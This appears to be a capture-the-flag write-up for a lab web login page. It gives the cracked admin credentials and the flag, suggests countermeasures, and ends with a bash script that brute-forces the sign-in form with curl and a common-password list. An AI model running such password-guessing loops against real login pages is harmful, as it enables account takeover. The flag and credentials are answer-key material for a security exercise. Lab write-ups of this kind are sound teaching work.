@@ -1,0 +1,33 @@
+http://192.168.57.3/index.php?page=signin
+
+You can use brute force to log in. 
+
+The website don't have any methodes to prevent brute force.
+You can try multipled password with any username to log in. 
+It time consuming but it the result that count. 
+
+Username = admin
+Password = shadow
+
+flag = B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2
+
+-------------------------- Countermeasure ----------------------------------------
+
+It not easy to prevent burte force attack , you don't know if the person forget the password or is attacking.
+And it not in the website interest to Ban permanatly someone (maybe he can be a customer someday)
+But you can set up some mean to prevent guessing a password.
+
+    - You can set up a temporary Ban (min, hour) to slow the burte force attack if the number of attend is to high.   
+    - You can send notification to the account if someone try to brute force it. 
+    - You can use captcha.
+    - Implement a Two factor authentication.
+
+-------------------------- Script ----------------------------------------
+
+#!/bin/bash
+
+password=(123456 password 12345678 azerty qwerty abc123 123456789 111111 1234567 iloveyou 123123 admin Admin 1234567890 letmein 1234 monkey shadow sunshine 12345 password1 princess trustno1 000000)
+
+for i in ${password[@]}; do
+	curl -X POST "http://192.168.57.3/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag'
+done
